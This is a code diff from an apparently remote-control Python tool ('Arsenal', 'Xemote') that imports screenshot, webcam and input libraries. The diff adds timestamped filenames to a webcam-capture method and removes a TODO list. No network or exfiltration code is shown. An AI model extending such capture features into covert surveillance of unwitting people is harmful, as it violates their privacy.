@@ -4,6 +4,7 @@ import json
 
 # Class: Arsenal
 import subprocess, cv2, pyautogui, pynput, ctypes
+from datetime import datetime
 
 # Class: Xemote
 import time, uuid, threading
@@ -184,11 +185,6 @@ class Database:
     - It uses the subprocess module for system commands.
     - It uses the cv2 module for webcam operations.
     - It uses the pyautogui module for screenshot operations.
-@TODO:
-    - Implement the device_shutdown_state method to handle the shutdown, reboot, and logoff commands.
-    - Implement the webcam method to capture an image from the webcam.
-    - Implement the screenshot method to capture a screenshot of the screen.
-    - Implement the __del__ method to perform cleanup.
 @status: Ongoing
 @version: 1.0
 @date: 2021-09-30
@@ -212,7 +208,14 @@ class Arsenal(Database):
     ~ Description: Capture image from webcam
     Status: Completed
     '''
-    def webcam(self, filename="image.jpg"):
+    def webcam(self):
+        # Generate Timestamp
+        def image_timestamp():
+            current_datetime = datetime.now()
+            return current_datetime.strftime("%d.%m.%Y-%H.%M.%S")
+            
+        filename = str(image_timestamp()) + ".jpg"
+
         # Create a VideoCapture object to access your webcam
         cap = cv2.VideoCapture(0)  # 0 corresponds to the default camera (usually the built-in webcam)
 
